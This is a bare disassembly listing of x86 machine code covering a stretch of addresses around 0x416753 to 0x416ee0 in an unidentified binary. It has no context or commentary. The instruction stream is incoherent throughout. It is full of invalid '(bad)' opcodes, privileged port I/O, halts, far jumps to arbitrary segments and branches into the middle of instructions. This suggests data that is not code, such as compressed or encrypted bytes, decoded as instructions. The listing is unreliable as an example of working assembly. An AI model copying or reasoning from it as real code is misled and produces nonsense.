  416753:	xadd   DWORD PTR [ecx],esp
  416756:	push   ebx
  416757:	pop    esp
  416758:	rol    BYTE PTR [esi-0xd3fa5f],cl
  41675e:	in     al,0xe
  416760:	jecxz  0x41670a
  416762:	xchg   ecx,eax
  416763:	rcr    BYTE PTR [edi+0x3fdb206f],cl
  416769:	or     eax,0xd8d251b5
  41676e:	je     0x416776
  416770:	ja     0x4167cb
  416772:	push   edx
  416773:	je     0x41675c
  416775:	div    BYTE PTR [edx-0x66]
  416778:	outs   dx,DWORD PTR ds:[esi]
  416779:	jg     0x4167d2
  41677b:	arpl   WORD PTR [ecx+0x31c9482],dx
  416781:	and    dh,BYTE PTR [ebp+0x71]
  416784:	(bad)  
  416785:	jle    0x4167dd
  416787:	sub    eax,0xb10bfce6
  41678c:	mov    ah,0x2
  41678e:	ds cmp al,0x20
  416791:	leave  
  416792:	sbb    eax,0xf6272b85
  416797:	retf   0x2292
  41679a:	push   ss
  41679b:	mov    bh,0x96
  41679d:	xchg   esi,eax
  41679e:	or     ebx,DWORD PTR [ecx+0x6]
  4167a1:	mov    BYTE PTR [ebx-0x5f7a0dfc],0x1
  4167a8:	data16 mov cl,0x8e
  4167ab:	push   esi
  4167ac:	fs scas al,BYTE PTR es:[edi]
  4167ae:	hlt    
  4167af:	arpl   WORD PTR [eax],dx
  4167b1:	sbb    eax,0xea14c268
  4167b6:	mov    dh,0x22
  4167b8:	(bad)  
  4167b9:	rcr    BYTE PTR [ebp+0x490ddf59],0x89
  4167c0:	js     0x41679e
  4167c2:	cwde   
  4167c3:	dec    esi
  4167c4:	ret    
  4167c5:	mov    al,0xe0
  4167c7:	cmp    bl,BYTE PTR [esi+0x32]
  4167ca:	mov    ch,0x2f
  4167cc:	loopne 0x4167e2
  4167ce:	(bad)  
  4167cf:	xchg   ecx,eax
  4167d0:	icebp  
  4167d1:	xor    eax,0x89c30c63
  4167d6:	aaa    
  4167d7:	ret    0x8e3f
  4167da:	mov    ah,al
  4167dc:	add    eax,0x56f59bf4
  4167e1:	push   cs
  4167e2:	pop    ss
  4167e3:	fdiv   QWORD PTR [ebx]
  4167e5:	enter  0x85be,0x61
  4167e9:	adc    dh,dh
  4167eb:	xlat   BYTE PTR ds:[ebx]
  4167ec:	jb     0x4167ea
  4167ee:	std    
  4167ef:	dec    ecx
  4167f0:	pop    eax
  4167f1:	aaa    
  4167f2:	xor    DWORD PTR [ebx],edx
  4167f4:	scas   eax,DWORD PTR es:[edi]
  4167f5:	nop
  4167f6:	arpl   WORD PTR [ecx+0x408b8b9],cx
  4167fc:	pushf  
  4167fd:	sub    al,0x52
  4167ff:	push   edx
  416800:	mov    edi,0xb53aecfe
  416805:	add    al,0xa3
  416807:	add    DWORD PTR [ebx+ecx*4-0x8],edi
  41680b:	js     0x41682c
  41680d:	int3   
  41680e:	ret    0x37dc
  416811:	add    eax,0x466093ab
  416816:	repnz cmp ebx,ebx
  416819:	jmp    0x416800
  41681b:	mov    eax,ds:0x5b763482
  416820:	push   ss
  416821:	ds jbe 0x4167b5
  416824:	jle    0x416881
  416826:	pop    ebp
  416827:	(bad)  
  416829:	pop    ss
  41682a:	mov    ds:0xdfc78e,al
  41682f:	stc    
  416830:	inc    edi
  416831:	cmp    eax,esi
  416833:	cdq    
  416834:	add    bl,0x9d
  416837:	and    DWORD PTR [eax],ebx
  416839:	outs   dx,BYTE PTR ds:[esi]
  41683a:	xchg   edi,eax
  41683b:	push   esp
  41683c:	xchg   ebp,eax
  41683d:	dec    esp
  41683e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41683f:	clc    
  416840:	jo     0x41687f
  416842:	pop    edi
  416843:	or     eax,0xc394fd5e
  416848:	test   BYTE PTR [edi-0xc],0x59
  41684c:	das    
  41684d:	ds add al,0x58
  416850:	jno    0x4168bf
  416852:	stos   BYTE PTR es:[edi],al
  416853:	aam    0x8c
  416855:	aam    0xcb
  416857:	fs dec esp
  416859:	imul   ecx,DWORD PTR [edi],0xffffffea
  41685c:	add    eax,0x90c9d7a4
  416861:	pop    ebx
  416862:	out    dx,eax
  416863:	enter  0xbc96,0x30
  416867:	mul    BYTE PTR [esi-0x39]
  41686a:	(bad)  
  41686b:	mov    BYTE PTR [eax+0x54],al
  41686e:	popa   
  41686f:	stos   DWORD PTR es:[edi],eax
  416870:	mov    ebp,0x2aabb6fe
  416875:	std    
  416876:	(bad)  
  416877:	xlat   BYTE PTR ds:[ebx]
  416878:	xor    BYTE PTR [edx-0x78d852b2],al
  41687e:	(bad)  
  41687f:	push   ds
  416880:	cmp    eax,0x8ca3d0b9
  416885:	xchg   BYTE PTR [eax+0x2bcaff5c],dh
  41688b:	mov    bl,0xe9
  41688d:	lahf   
  41688e:	or     eax,0x14dd1b8c
  416893:	or     dl,ch
  416895:	dec    edi
  416896:	int3   
  416897:	hlt    
  416898:	(bad)  
  41689a:	push   ebx
  41689b:	push   edi
  41689c:	fdivp  st(3),st
  41689e:	push   eax
  41689f:	pop    ebx
  4168a0:	and    ecx,esi
  4168a2:	dec    edi
  4168a3:	xchg   DWORD PTR ds:0xb82738fd,edx
  4168a9:	test   DWORD PTR [ecx-0x415207d6],0xc98162a
  4168b3:	push   esi
  4168b4:	scas   eax,DWORD PTR es:[edi]
  4168b5:	aas    
  4168b6:	adc    al,0x9
  4168b8:	cmc    
  4168b9:	pop    ds
  4168ba:	enter  0xa0e9,0xd8
  4168be:	add    esi,DWORD PTR [ebp+0x43]
  4168c1:	push   ebx
  4168c2:	in     eax,dx
  4168c3:	xlat   BYTE PTR ds:[ebx]
  4168c4:	push   ss
  4168c5:	sti    
  4168c6:	or     al,0xd2
  4168c8:	inc    ebp
  4168c9:	stc    
  4168ca:	fild   QWORD PTR [eax-0x227fe497]
  4168d0:	xor    dl,BYTE PTR [esi-0x57]
  4168d3:	dec    esi
  4168d4:	ret    0x8757
  4168d7:	or     edx,ebx
  4168d9:	cld    
  4168da:	mov    ds:0x2b3a9ead,eax
  4168df:	pop    esi
  4168e0:	leave  
  4168e1:	xor    eax,ebx
  4168e3:	or     al,0x5e
  4168e5:	in     eax,dx
  4168e6:	lahf   
  4168e7:	shl    DWORD PTR [ebx+0x784861ac],0x39
  4168ee:	mov    esp,0x5dec1dbc
  4168f3:	add    BYTE PTR [edi-0x35015e68],al
  4168f9:	dec    esp
  4168fa:	inc    esi
  4168fb:	inc    ebx
  4168fc:	jle    0x4168a0
  4168fe:	stos   DWORD PTR es:[edi],eax
  4168ff:	popf   
  416900:	or     BYTE PTR [edi+0x11],dl
  416903:	aaa    
  416904:	ds repz inc esp
  416907:	arpl   WORD PTR [eax],bx
  416909:	loop   0x41698a
  41690b:	xchg   edx,eax
  41690c:	push   cs
  41690d:	lea    ebp,[esi]
  41690f:	das    
  416910:	adc    BYTE PTR [eax+0x2c],dl
  416913:	inc    bh
  416915:	repz jle 0x416946
  416918:	or     BYTE PTR [edx+0x2085faa6],ch
  41691e:	inc    esi
  41691f:	mov    ecx,0xc5ad3da7
  416924:	scas   eax,DWORD PTR es:[edi]
  416925:	repnz popf 
  416927:	sub    al,BYTE PTR ds:0x12457ec4
  41692d:	cs inc ebx
  41692f:	je     0x416968
  416931:	dec    edi
  416932:	icebp  
  416933:	xor    ah,BYTE PTR [ebx]
  416935:	xor    BYTE PTR [edx+0x6b],dh
  416938:	les    eax,FWORD PTR cs:[ebp-0x7d]
  41693c:	(bad)  
  41693d:	rol    DWORD PTR [ecx+eax*1-0x257dabd7],cl
  416944:	jg     0x416913
  416946:	and    BYTE PTR [esi+0x3e],bl
  416949:	pushf  
  41694a:	mov    al,ds:0x7fe1bbde
  41694f:	out    dx,al
  416950:	or     BYTE PTR [eax+0x7b6a3490],bh
  416956:	repz cdq 
  416958:	jmp    0x4168ed
  41695a:	shl    BYTE PTR [edi-0x20],1
  41695d:	push   esi
  41695e:	mov    bh,0xd9
  416960:	push   esi
  416961:	mov    ah,0x11
  416963:	mov    eax,DWORD PTR [edx]
  416965:	adc    al,0x8f
  416967:	sub    DWORD PTR [eax+0x69],0x6153794e
  41696e:	jae    0x416931
  416970:	jae    0x4169ce
  416972:	add    eax,0x9c228d47
  416977:	mov    esp,0xdd1f166d
  41697c:	add    eax,0xbe56ea08
  416981:	test   al,0x49
  416983:	cmp    BYTE PTR [ebp-0x16],0x7d
  416987:	call   0x8e90:0xce93eefa
  41698e:	aaa    
  41698f:	push   edx
  416990:	outs   dx,DWORD PTR ds:[esi]
  416991:	test   DWORD PTR [esi+0x25],0xe175fc4
  416998:	jae    0x4169ad
  41699a:	pop    es
  41699b:	mov    al,ds:0x6b319bcc
  4169a0:	mov    ds:0x54d7d4a1,al
  4169a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169a6:	sub    bh,0x4d
  4169a9:	sub    eax,0x459aeb66
  4169ae:	jmp    0x41fd:0xf99aeaa6
  4169b5:	out    dx,eax
  4169b6:	sahf   
  4169b7:	jmp    0x8b7f:0x11ef54b6
  4169be:	(bad)  
  4169bf:	cwde   
  4169c0:	xchg   BYTE PTR [ebp+0xd808dfe],bl
  4169c6:	in     eax,dx
  4169c7:	fbstp  TBYTE PTR [ebx+0x31e18c83]
  4169cd:	clc    
  4169ce:	cmp    DWORD PTR [ebx],eax
  4169d0:	xchg   ebx,eax
  4169d1:	add    ecx,ebp
  4169d3:	sub    DWORD PTR [ebp+0x34],esp
  4169d6:	xor    al,0x8f
  4169d8:	es out dx,al
  4169da:	dec    ebp
  4169db:	arpl   cx,dx
  4169dd:	mov    ds:0xcf522ffc,al
  4169e2:	sub    eax,0x9bad4549
  4169e7:	sub    dl,BYTE PTR [esi]
  4169e9:	mov    esi,0x3027435d
  4169ee:	mov    ebx,0x6495cfa9
  4169f3:	mov    ecx,DWORD PTR [ebp+0x146b9cd2]
  4169f9:	leave  
  4169fa:	in     eax,dx
  4169fb:	adc    DWORD PTR [esi-0x6e],ecx
  4169fe:	mov    bh,BYTE PTR [ebp+edx*8+0x41]
  416a02:	and    eax,ebx
  416a04:	enter  0x14ae,0x73
  416a08:	les    eax,FWORD PTR [esi+0x41]
  416a0b:	mov    DWORD PTR [ecx+0x17aea089],ebx
  416a11:	pop    edi
  416a12:	rol    DWORD PTR [ebx+edx*2+0x3b85c6db],0x8e
  416a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a1b:	ficom  DWORD PTR [esi]
  416a1d:	ins    BYTE PTR es:[edi],dx
  416a1e:	shl    DWORD PTR [edx+edi*8-0x5a],0xaf
  416a23:	mov    dh,0xac
  416a25:	mov    bl,0x90
  416a27:	leave  
  416a28:	aad    0xf3
  416a2a:	call   0x2aafbead
  416a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a31:	and    al,0xab
  416a33:	jle    0x4169c6
  416a35:	pop    esp
  416a36:	xchg   ebx,eax
  416a37:	push   ebp
  416a38:	mov    eax,0x1b682b0e
  416a3d:	ins    BYTE PTR es:[edi],dx
  416a3e:	outs   dx,BYTE PTR ds:[esi]
  416a3f:	pop    esp
  416a40:	jecxz  0x416a9b
  416a42:	stos   DWORD PTR es:[edi],eax
  416a43:	sbb    al,0x7b
  416a45:	popf   
  416a46:	out    dx,eax
  416a47:	retf   0xfc13
  416a4a:	outs   dx,BYTE PTR ds:[esi]
  416a4b:	fwait
  416a4c:	push   edx
  416a4d:	push   ebx
  416a4e:	adc    edi,DWORD PTR [edi]
  416a50:	scas   eax,DWORD PTR es:[edi]
  416a51:	mov    ds,WORD PTR [eax+esi*1-0x602d572f]
  416a58:	mov    al,0x9f
  416a5a:	dec    edx
  416a5b:	int    0x90
  416a5d:	nop
  416a5e:	dec    esp
  416a5f:	inc    esi
  416a60:	jge    0x416ab6
  416a62:	dec    ebp
  416a63:	sbb    al,BYTE PTR [ebp+0x5a]
  416a66:	nop
  416a67:	inc    edx
  416a68:	push   ebx
  416a69:	js     0x416a6c
  416a6b:	scas   al,BYTE PTR es:[edi]
  416a6c:	out    dx,eax
  416a6d:	mov    ch,0xfa
  416a6f:	mov    ebx,0xf99642f8
  416a74:	cs cli 
  416a76:	stos   BYTE PTR es:[edi],al
  416a77:	loop   0x416ab5
  416a79:	retf   
  416a7a:	fcom   st(6)
  416a7c:	xor    al,bh
  416a7e:	push   ebp
  416a7f:	lock cs mov edx,0xde1196dc
  416a86:	out    0x3c,eax
  416a88:	jns    0x416a29
  416a8a:	into   
  416a8b:	push   esp
  416a8c:	dec    edx
  416a8d:	(bad)  
  416a8e:	fcomp  QWORD PTR [eax]
  416a90:	mov    eax,ds:0x62633097
  416a95:	je     0x416ad5
  416a97:	pop    eax
  416a98:	fistp  WORD PTR ds:0x63a554e1
  416a9e:	and    al,0xbb
  416aa0:	retf   
  416aa1:	fwait
  416aa2:	std    
  416aa3:	lods   eax,DWORD PTR ds:[esi]
  416aa4:	int3   
  416aa5:	push   esp
  416aa6:	ins    BYTE PTR es:[edi],dx
  416aa7:	inc    esi
  416aa8:	xchg   ebx,eax
  416aa9:	mov    ebp,0xa8e104f2
  416aae:	push   eax
  416aaf:	pop    ss
  416ab0:	in     al,0x15
  416ab2:	jae    0x416b33
  416ab4:	sub    edx,DWORD PTR [esi+0x2f]
  416ab7:	mov    ds,WORD PTR [ebx+edx*1]
  416aba:	jl     0x416a5e
  416abc:	lods   al,BYTE PTR ds:[esi]
  416abd:	xor    ch,BYTE PTR [edi-0x72]
  416ac0:	or     eax,0xe4564a8
  416ac5:	ds lahf 
  416ac7:	sahf   
  416ac8:	mov    edx,0xf019e2ae
  416acd:	jne    0x416a58
  416acf:	cmp    eax,0xe9cd7777
  416ad4:	xchg   esp,eax
  416ad5:	xchg   DWORD PTR [eax],ecx
  416ad7:	adc    ah,cl
  416ad9:	mov    ss,WORD PTR [edx-0x7d]
  416adc:	sbb    BYTE PTR [eax+eiz*1],0x3e
  416ae0:	cld    
  416ae1:	mov    ds:0x6e09c124,al
  416ae6:	lods   eax,DWORD PTR ds:[esi]
  416ae7:	ds cmp edx,esi
  416aea:	in     eax,0x0
  416aec:	cli    
  416aed:	push   edi
  416aee:	adc    ah,dh
  416af0:	jmp    0xe0da:0x90cf88d4
  416af7:	sahf   
  416af8:	lods   eax,DWORD PTR ds:[esi]
  416af9:	call   0x500e326c
  416afe:	stos   BYTE PTR es:[edi],al
  416aff:	ins    DWORD PTR es:[edi],dx
  416b00:	(bad)  
  416b02:	push   ebp
  416b03:	xor    bl,BYTE PTR [ebx]
  416b05:	mov    edx,0x2c1b9454
  416b0a:	mov    bl,0x79
  416b0c:	push   eax
  416b0d:	int    0xbb
  416b0f:	(bad)  [esi-0xefcc027]
  416b15:	scas   al,BYTE PTR es:[edi]
  416b16:	inc    edx
  416b17:	hlt    
  416b18:	pop    ds
  416b19:	dec    ebp
  416b1a:	push   ds
  416b1b:	pop    es
  416b1c:	fsubr  st,st(4)
  416b1e:	into   
  416b1f:	jmp    0x42757536
  416b24:	ud2    
  416b26:	das    
  416b27:	dec    ebx
  416b28:	and    ebp,DWORD PTR ds:0xcda49bb2
  416b2e:	or     eax,0x6821643b
  416b33:	and    DWORD PTR [di],edi
  416b36:	add    DWORD PTR [esi+esi*8-0x2ea4920b],ebx
  416b3d:	adc    BYTE PTR [ecx-0x1cbb3a37],bl
  416b43:	sub    edx,esp
  416b45:	ins    BYTE PTR es:[edi],dx
  416b46:	fisub  DWORD PTR [edi-0x74]
  416b49:	sbb    DWORD PTR [esi],eax
  416b4b:	push   0xffffffed
  416b4d:	add    edx,DWORD PTR [ebx]
  416b4f:	stos   DWORD PTR es:[edi],eax
  416b50:	sub    dh,bh
  416b52:	lods   al,BYTE PTR ds:[esi]
  416b53:	mov    esi,eax
  416b55:	push   ebx
  416b56:	pusha  
  416b57:	xchg   esp,eax
  416b58:	pop    ecx
  416b59:	xchg   DWORD PTR [ebx],esi
  416b5b:	js     0x416b66
  416b5d:	xor    ah,BYTE PTR [edi+esi*2]
  416b60:	stos   DWORD PTR es:[edi],eax
  416b61:	xor    ebp,DWORD PTR [eax+0x52]
  416b64:	out    0xeb,al
  416b66:	hlt    
  416b67:	push   ecx
  416b68:	fmul   QWORD PTR [eax+0x6d]
  416b6b:	(bad)  
  416b6c:	jp     0x416b38
  416b6e:	jle    0x416b92
  416b70:	mov    edi,0xf0e87234
  416b75:	stos   BYTE PTR es:[edi],al
  416b76:	das    
  416b77:	dec    eax
  416b78:	fsub   DWORD PTR [ecx-0x705ecf58]
  416b7e:	xchg   edi,eax
  416b7f:	lds    esi,FWORD PTR [eax]
  416b81:	fmul   DWORD PTR [eax-0x5a]
  416b84:	cdq    
  416b85:	push   ds
  416b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b87:	sti    
  416b88:	or     al,0x50
  416b8a:	int    0x6e
  416b8c:	jp     0x416b44
  416b8e:	jne    0x416baa
  416b90:	add    dh,BYTE PTR [edi+0x51]
  416b93:	out    dx,eax
  416b94:	pop    ds
  416b95:	push   es
  416b96:	pop    edi
  416b97:	sub    DWORD PTR [edi+edi*1-0x3cd71412],edx
  416b9e:	or     cl,BYTE PTR [esi+ecx*2]
  416ba1:	inc    eax
  416ba2:	pop    edx
  416ba3:	loopne 0x416bc6
  416ba5:	mov    dl,0x29
  416ba7:	mov    esi,0x89f95ec6
  416bac:	push   edi
  416bad:	(bad)  
  416baf:	jne    0x416ba4
  416bb1:	in     eax,dx
  416bb2:	popa   
  416bb3:	adc    BYTE PTR [eax],cl
  416bb5:	in     al,dx
  416bb6:	xor    al,0xa0
  416bb8:	aaa    
  416bb9:	pop    ebp
  416bba:	xor    BYTE PTR [edi+0x3e],dl
  416bbd:	sub    BYTE PTR [ecx],cl
  416bbf:	jle    0x416b56
  416bc1:	jnp    0x416c13
  416bc3:	push   0xd1cfb65e
  416bc8:	add    BYTE PTR [eax-0x9d901a6],0x3a
  416bcf:	add    bl,BYTE PTR [esi-0x6ea54c8a]
  416bd5:	and    cl,BYTE PTR [esi]
  416bd7:	or     edi,ecx
  416bd9:	js     0x416c1e
  416bdb:	fsub   QWORD PTR [eax+0x6]
  416bde:	pusha  
  416bdf:	arpl   WORD PTR [esi],sp
  416be1:	cwde   
  416be2:	mov    edi,0x45bded23
  416be7:	pusha  
  416be8:	adc    eax,0x37e371e2
  416bed:	das    
  416bee:	cs aam 0xaf
  416bf1:	fsubr  QWORD PTR [ebx+0x4663ee28]
  416bf7:	push   es
  416bf8:	out    0xe0,al
  416bfa:	mov    dl,0x47
  416bfc:	aad    0xa8
  416bfe:	mov    WORD PTR [ecx],ds
  416c00:	ss add edx,ecx
  416c03:	out    0x83,al
  416c05:	jno    0x416bfd
  416c07:	adc    DWORD PTR [edx+ebp*1-0x6f4f2ee1],edx
  416c0e:	fsubp  st(0),st
  416c10:	mov    cl,0x26
  416c12:	cmp    bl,bl
  416c14:	xchg   ch,ch
  416c16:	xor    eax,DWORD PTR [ecx]
  416c18:	test   bh,bh
  416c1a:	std    
  416c1b:	adc    DWORD PTR [edi-0x2565f461],esi
  416c21:	dec    edi
  416c22:	pushf  
  416c23:	jl     0x416bcf
  416c25:	iret   
  416c26:	aas    
  416c27:	test   al,0xb6
  416c29:	lds    esi,FWORD PTR [ecx+0x374a6f6d]
  416c2f:	push   ebp
  416c30:	gs cmp al,dh
  416c33:	aam    0x7
  416c35:	cmp    ebp,DWORD PTR [ecx+0x8]
  416c38:	or     cl,BYTE PTR [eax-0x5de4866a]
  416c3e:	test   al,dl
  416c40:	sub    DWORD PTR [edx+0x40],edx
  416c43:	sbb    eax,0xbf984174
  416c48:	mov    edx,0xe941019e
  416c4d:	leave  
  416c4e:	pop    edx
  416c4f:	imul   edx,DWORD PTR [edi-0x498f622f],0x53dfc3d
  416c59:	leave  
  416c5a:	loopne 0x416c76
  416c5c:	aas    
  416c5d:	out    dx,al
  416c5e:	adc    ch,ch
  416c60:	popf   
  416c61:	cmc    
  416c62:	jecxz  0x416c5c
  416c64:	pop    ss
  416c65:	ins    BYTE PTR es:[edi],dx
  416c66:	arpl   WORD PTR [edi],si
  416c68:	sti    
  416c69:	add    bl,ch
  416c6b:	ins    BYTE PTR es:[edi],dx
  416c6c:	cmp    al,0x38
  416c6e:	push   cs
  416c6f:	stc    
  416c70:	fistp  QWORD PTR [edi-0xd]
  416c73:	pop    ecx
  416c74:	aaa    
  416c75:	repnz mov eax,ds:0xf538e10b
  416c7b:	push   eax
  416c7c:	push   ebp
  416c7d:	ja     0x416c04
  416c7f:	push   0x340b2ae5
  416c84:	inc    esi
  416c85:	mov    bl,0xe7
  416c87:	dec    edx
  416c88:	ins    BYTE PTR es:[edi],dx
  416c89:	cs xchg esi,eax
  416c8b:	(bad)  
  416c8c:	ficom  DWORD PTR [ecx-0x32]
  416c8f:	enter  0x64a5,0xe9
  416c93:	jg     0x416c17
  416c95:	lods   al,BYTE PTR ds:[esi]
  416c96:	rol    DWORD PTR [edi+0x677a914d],1
  416c9c:	out    0x67,al
  416c9e:	inc    eax
  416c9f:	add    BYTE PTR [ebp+0x37],dh
  416ca2:	jbe    0x416c40
  416ca4:	fwait
  416ca5:	and    ebp,edi
  416ca7:	pusha  
  416ca8:	les    esi,FWORD PTR [ebp+ecx*2-0x54a08061]
  416caf:	mov    edx,DWORD PTR [ebx]
  416cb1:	icebp  
  416cb2:	in     al,0x87
  416cb4:	fchs   
  416cb6:	push   cs
  416cb7:	xor    BYTE PTR [esi],bh
  416cb9:	mov    ecx,0x3236a90e
  416cbe:	sbb    eax,0xf176a32c
  416cc3:	pop    edi
  416cc4:	fdiv   QWORD PTR [eax]
  416cc6:	daa    
  416cc7:	or     edx,DWORD PTR ds:0x1a166a94
  416ccd:	ret    
  416cce:	xlat   BYTE PTR ds:[ebx]
  416ccf:	add    BYTE PTR [ebx+0x7e48feea],cl
  416cd5:	out    dx,al
  416cd6:	cmp    DWORD PTR [ebx+ebx*1],edi
  416cd9:	in     al,dx
  416cda:	ret    0x1d9f
  416cdd:	(bad)  
  416cde:	movlps QWORD PTR [ebx-0x8],xmm3
  416ce2:	test   al,0x38
  416ce4:	repz ret 
  416ce6:	sti    
  416ce7:	outs   dx,DWORD PTR ds:[esi]
  416ce8:	stos   BYTE PTR es:[edi],al
  416ce9:	adc    DWORD PTR [ecx+0x38],0x54
  416ced:	cdq    
  416cee:	mov    dh,0x55
  416cf0:	fld    DWORD PTR [edx]
  416cf2:	or     DWORD PTR [ebx],ebp
  416cf4:	enter  0x595,0x2b
  416cf8:	pop    edx
  416cf9:	push   edx
  416cfa:	mov    edx,DWORD PTR [ecx*1-0x367f58be]
  416d01:	mov    dh,0xf5
  416d03:	outs   dx,BYTE PTR ds:[esi]
  416d04:	xchg   DWORD PTR ds:0xb5ab0461,eax
  416d0a:	xor    DWORD PTR [esi+ebp*4],ecx
  416d0d:	cmp    DWORD PTR [esi],esi
  416d0f:	pop    ds
  416d10:	mov    WORD PTR [esp+edx*1+0x3a975cb7],gs
  416d17:	mov    ebp,es
  416d19:	sbb    ch,dh
  416d1b:	push   es
  416d1c:	and    DWORD PTR [ecx-0x37],0x6f
  416d20:	xor    BYTE PTR [edi-0x49],dl
  416d23:	push   0x29f5ea6
  416d28:	stos   BYTE PTR es:[edi],al
  416d29:	js     0x416cd1
  416d2b:	jno    0x416d42
  416d2d:	sbb    ah,BYTE PTR [ecx]
  416d2f:	and    eax,0xdc115bce
  416d34:	popa   
  416d35:	pushf  
  416d36:	mov    esi,0x91ecbd22
  416d3b:	or     ah,BYTE PTR [esi]
  416d3d:	ja     0x416d6c
  416d3f:	add    al,bl
  416d41:	mov    ebp,DWORD PTR [esi-0x5ab497ce]
  416d47:	dec    eax
  416d48:	in     al,dx
  416d49:	and    dh,0x24
  416d4c:	popa   
  416d4d:	cmp    edx,DWORD PTR [ebx+0x4d00f461]
  416d53:	fs ins BYTE PTR es:[edi],dx
  416d55:	popa   
  416d56:	gs jnp 0x416d3b
  416d59:	iret   
  416d5a:	mov    ss,WORD PTR [esi]
  416d5c:	shl    DWORD PTR [ebx+0x3f],0x11
  416d60:	or     BYTE PTR [edx],dh
  416d62:	push   ebx
  416d63:	pop    edi
  416d64:	(bad)  
  416d65:	rcl    DWORD PTR cs:[eax+0x7d66c809],0x83
  416d6d:	sbb    BYTE PTR [edi-0xdd481cd],dl
  416d73:	mov    al,0xb
  416d75:	in     al,0xa2
  416d77:	cmp    ebx,0x3f7519dd
  416d7d:	cwde   
  416d7e:	pop    ebx
  416d7f:	nop
  416d80:	aam    0x9a
  416d82:	xchg   esi,eax
  416d83:	les    ecx,FWORD PTR [edi+0x2af5ffe8]
  416d89:	int3   
  416d8a:	icebp  
  416d8b:	loop   0x416d4a
  416d8d:	scas   eax,DWORD PTR es:[edi]
  416d8e:	mov    al,ds:0xb3b2fa3f
  416d93:	pop    ebx
  416d94:	xchg   edx,eax
  416d95:	(bad)  
  416d97:	inc    edx
  416d98:	pop    ebx
  416d99:	cmp    DWORD PTR [eax],0x86d0c44d
  416d9f:	in     al,0x4c
  416da1:	lock inc esi
  416da3:	sbb    BYTE PTR [ebx-0x67],al
  416da6:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  416da8:	mov    ds:0x5a6b79de,eax
  416dad:	push   ss
  416dae:	dec    edi
  416daf:	pop    edi
  416db0:	repnz test al,0x74
  416db3:	add    bh,BYTE PTR [eax-0x324cc8d4]
  416db9:	mov    esi,0x9bb9626b
  416dbe:	pusha  
  416dbf:	out    0x16,al
  416dc1:	push   ds
  416dc2:	jl     0x416e43
  416dc4:	inc    edx
  416dc5:	mov    ch,0x2
  416dc7:	mov    WORD PTR [edx-0x2a96dfd9],fs
  416dcd:	xor    al,0x32
  416dcf:	js     0x416df9
  416dd1:	js     0x416df5
  416dd3:	(bad)  
  416dd4:	pusha  
  416dd5:	cwde   
  416dd6:	popf   
  416dd7:	jmp    0x5f8442b
  416ddc:	jmp    0x416e0a
  416dde:	cmp    eax,0xd82f89f5
  416de3:	sbb    ebp,DWORD PTR [ebp+0x73]
  416de6:	sub    al,0xc3
  416de8:	push   esp
  416de9:	imul   esi,DWORD PTR [eax+0x2f],0x4bd81796
  416df0:	sbb    DWORD PTR [edi+0x7651ee8a],0x52
  416df7:	inc    ebp
  416df8:	call   0x118:0x92208954
  416dff:	add    al,0xf0
  416e01:	adc    eax,0x5ab981df
  416e06:	(bad)  
  416e07:	loope  0x416e53
  416e09:	arpl   WORD PTR [eax+eiz*2+0x5b],cx
  416e0d:	mov    ecx,0x495047e8
  416e12:	inc    edi
  416e13:	lea    eax,[edi+ebx*8]
  416e16:	out    0x77,al
  416e18:	inc    ecx
  416e19:	pusha  
  416e1a:	xor    BYTE PTR [esi-0x60],dh
  416e1d:	data16 (bad) 
  416e20:	icebp  
  416e21:	mov    eax,0x11c3f71f
  416e26:	cs or  dl,ah
  416e29:	sub    al,0x4d
  416e2b:	mov    ecx,0x77e8c05c
  416e30:	out    dx,al
  416e31:	add    eax,0xdf0cc47c
  416e36:	stc    
  416e37:	mov    al,0xe1
  416e39:	js     0x416dd9
  416e3b:	cwde   
  416e3c:	inc    edi
  416e3d:	xor    eax,0xb360711d
  416e42:	mov    DWORD PTR [ebx],0x96c22780
  416e48:	sub    ah,BYTE PTR gs:[ebp+ebp*8+0x79]
  416e4d:	and    al,BYTE PTR [edi-0x78ca3af1]
  416e53:	xchg   DWORD PTR [ebp-0x1c2fa3ef],ebx
  416e59:	xchg   edx,eax
  416e5a:	xor    al,0x2a
  416e5c:	into   
  416e5d:	jae    0x416e3c
  416e5f:	and    al,0xac
  416e61:	xchg   ebx,eax
  416e62:	sbb    eax,esp
  416e64:	scas   al,BYTE PTR es:[edi]
  416e65:	shr    BYTE PTR [eax],0xf2
  416e68:	js     0x416ebe
  416e6a:	je     0x416e38
  416e6c:	mov    al,BYTE PTR [ecx+0x10]
  416e6f:	test   al,0xc6
  416e71:	push   ecx
  416e72:	jbe    0x416e5a
  416e74:	xchg   ebp,eax
  416e75:	sbb    BYTE PTR [edx],bh
  416e77:	sbb    cl,ch
  416e79:	add    dl,bl
  416e7b:	and    ebx,esp
  416e7d:	lahf   
  416e7e:	les    edi,FWORD PTR [edi+0x3e]
  416e81:	push   edx
  416e82:	push   es
  416e83:	in     eax,dx
  416e84:	xchg   esp,eax
  416e85:	arpl   cx,sp
  416e87:	sub    eax,0xd72f22c9
  416e8c:	pop    eax
  416e8d:	aaa    
  416e8e:	ss pop edx
  416e90:	sbb    DWORD PTR ds:0x383a5013,esp
  416e96:	jb     0x416e86
  416e98:	xchg   DWORD PTR [ebx+0x1f94ac2d],esp
  416e9e:	mov    ch,0xa3
  416ea0:	and    ch,bh
  416ea2:	xchg   BYTE PTR ds:0xd17187a4,bh
  416ea8:	inc    DWORD PTR [ebx-0x35]
  416eab:	ja     0x416e9f
  416ead:	xor    BYTE PTR [ebx],bh
  416eaf:	arpl   WORD PTR [ebp-0x75],di
  416eb2:	push   edx
  416eb3:	pop    es
  416eb4:	xchg   esi,eax
  416eb5:	jl     0x416e46
  416eb7:	pop    ebx
  416eb8:	call   0xe82b6f98
  416ebd:	cmc    
  416ebe:	lock pop ebp
  416ec0:	mov    al,0xa8
  416ec2:	pusha  
  416ec3:	mov    esi,0xe5f2de7a
  416ec8:	or     eax,0xaf6cbc
  416ecd:	test   edx,ebp
  416ecf:	inc    ebp
  416ed0:	lahf   
  416ed1:	cli    
  416ed2:	mov    DWORD PTR [ecx-0x30],edi
  416ed5:	inc    ebp
  416ed6:	sub    al,0x78
  416ed8:	out    dx,eax
  416ed9:	xor    eax,edi
  416edb:	xor    eax,0xf65e1aa0
  416ee0:	rol    BYTE PTR [ebp+0x55],0x2c
